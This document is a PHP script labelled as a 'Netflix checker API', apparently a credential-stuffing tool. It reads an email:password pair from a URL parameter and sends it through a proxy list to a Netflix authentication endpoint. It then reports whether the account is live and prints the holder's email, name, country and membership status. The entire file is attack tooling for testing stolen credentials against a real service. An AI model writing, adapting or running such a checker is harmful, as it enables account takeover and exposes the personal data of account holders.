<?php

/*

[Netflix checker API]
This checker was created by @thetrueplayton (CoutM).
For information, contact us!
Do you want our other projects? Support us by sharing the channel.
Forbidden to distribute this script by itself.

*/


if(isset($_GET['acc']))
{

$account = $_GET['acc'];
$find = strpos($account, ':');
$psw = substr($account, $find+1);
$clearemail = rtrim($account, $psw);
$email = rtrim($clearemail, ':');


$proxylist = file('proxy.txt', FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);	//Replace proxy with proxylist name

    //Open the call
    $ch = curl_init();
	curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 0);
      
      foreach($proxylist as $proxy)
      {	
        curl_setopt($ch, CURLOPT_PROXY, $proxy);  
      }
        
	curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-Type: application/json'));
	curl_setopt($ch, CURLOPT_POSTFIELDS, "email=$email&password=$psw");
	curl_setopt($ch, CURLOPT_URL, 'https://api-global.netflix.com/account/auth');
	$response = curl_exec($ch);
	
    curl_close($ch);	//Close the connection

	
	$output = json_decode($response, TRUE);		//Decoding the response and transforming it into a string	
		
        //This message will be sent when the account is dead
        if(strpos($response, "Failed to authenticate credentials.")===0) echo "Account don't working...";
        else 
        {
        
        //This message will be sent when the account is live
        echo "Account working... <br />
        Email: ".$output['user']['emailAddress']."<br />
        Nome: ".$output['user']['firstName']."<br />
        Cognome: ".$output['user']['lastName']."<br />
        Country: ".$output['user']['country']."<br />
        Locale: ".$output['user']['locale']."<br />
        membership: ".$output['user']['membershipStatus'];
		
        }

}

?>
